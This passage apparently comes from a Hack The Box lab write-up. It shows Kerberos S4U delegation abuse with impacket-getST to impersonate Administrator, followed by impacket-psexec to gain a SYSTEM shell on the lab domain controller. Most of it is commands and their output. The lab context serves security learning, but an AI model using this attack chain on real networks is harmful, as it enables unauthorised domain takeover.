### This is where delegation comes into play.

Kerberos S4U

``` python
impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' 'pirate.htb/a.white_adm:Password123!' -dc-ip $target -altservice 'CIFS/DC01.pirate.htb'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

```


``` python
HTB:10.10.14.38
$ export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

rc@Cesar:/mnt/c/Users/cesar/HTB/Pirate2
HTB:10.10.14.38
$
rc@Cesar:/mnt/c/Users/cesar/HTB/Pirate2
HTB:10.10.14.38
$ klist
Ticket cache: FILE:Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
Default principal: Administrator@pirate.htb

Valid starting       Expires              Service principal
03/04/2026 10:44:35  03/04/2026 20:44:34  CIFS/DC01.pirate.htb@PIRATE.HTB
        renew until 03/05/2026 10:43:04

rc@Cesar:/mnt/c/Users/cesar/HTB/Pirate2
HTB:10.10.14.38
$ impacket-psexec -k -no-pass DC01.pirate.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file PbzmCejV.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Creating service ERUO on DC01.pirate.htb.....
[*] Starting service ERUO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd Users
The system cannot find the path specified.

C:\Windows\system32> cd /Users

C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 32B5-074E

 Directory of C:\Users

03/04/2026  07:39 AM    <DIR>          .
03/04/2026  07:39 AM    <DIR>          ..
01/16/2026  12:40 AM    <DIR>          Administrator
03/04/2026  07:39 AM    <DIR>          gMSA_ADCS_prod$
06/08/2025  06:32 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   3,501,887,488 bytes free

C:\Users> cd Administrator

C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 32B5-074E

 Directory of C:\Users\Administrator

01/16/2026  12:40 AM    <DIR>          .
01/16/2026  12:40 AM    <DIR>          ..
02/24/2026  04:30 PM    <DIR>          3D Objects
02/24/2026  04:30 PM    <DIR>          Contacts
03/04/2026  03:52 AM    <DIR>          Desktop
03/04/2026  03:52 AM    <DIR>          Documents
02/24/2026  04:30 PM    <DIR>          Downloads
02/24/2026  04:30 PM    <DIR>          Favorites
02/24/2026  04:30 PM    <DIR>          Links
02/24/2026  04:30 PM    <DIR>          Music
02/24/2026  04:30 PM    <DIR>          Pictures
02/24/2026  04:30 PM    <DIR>          Saved Games
02/24/2026  04:30 PM    <DIR>          Searches
02/24/2026  04:30 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,501,887,488 bytes free
```

thanks.